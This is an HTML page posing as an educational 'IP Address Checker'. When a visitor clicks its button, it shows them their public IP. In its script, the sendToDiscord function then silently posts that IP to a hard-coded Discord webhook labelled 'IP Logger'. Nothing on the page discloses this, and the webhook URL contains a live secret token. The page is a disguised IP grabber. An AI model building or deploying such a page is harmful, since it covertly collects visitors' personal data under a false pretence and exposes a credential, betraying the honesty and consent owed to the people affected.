<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Address Checker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        .container {
            background-color: #f5f5f5;
            border-radius: 8px;
            padding: 20px;
            margin-top: 50px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 20px 0;
            cursor: pointer;
            border-radius: 4px;
        }
        #result {
            margin-top: 20px;
            padding: 10px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>IP Address Checker</h1>
        <p>This educational tool demonstrates how websites can retrieve your public IP address.</p>
        <button onclick="getIP()">Check My IP Address</button>
        <div id="result"></div>
    </div>

    <script>
        async function getIP() {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = '<p>Fetching your IP address...</p>';
            
            try {
                // First try a direct IP API
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                resultDiv.innerHTML = `<p>Your IP address is: <strong>${ip}</strong></p>`;
                
                // Send to Discord webhook
                await sendToDiscord(ip);
                
            } catch (error) {
                console.error('Error:', error);
                resultDiv.innerHTML = '<p>Could not retrieve your IP address. Please try again.</p>';
            }
        }
        
        async function sendToDiscord(ip) {
            const webhookURL = 'https://discord.com/api/webhooks/1399035671615770624/g1A644wWghVQ6TG4O8KUqPf-fnKpc-tz9zfOmL87F8O62cvFHau6RRixce898rnx0hF3';
            
            const payload = {
                content: `New IP address logged: ${ip}`,
                username: 'IP Logger',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/1791/1791961.png'
            };
            
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }
    </script>
</body>
</html>
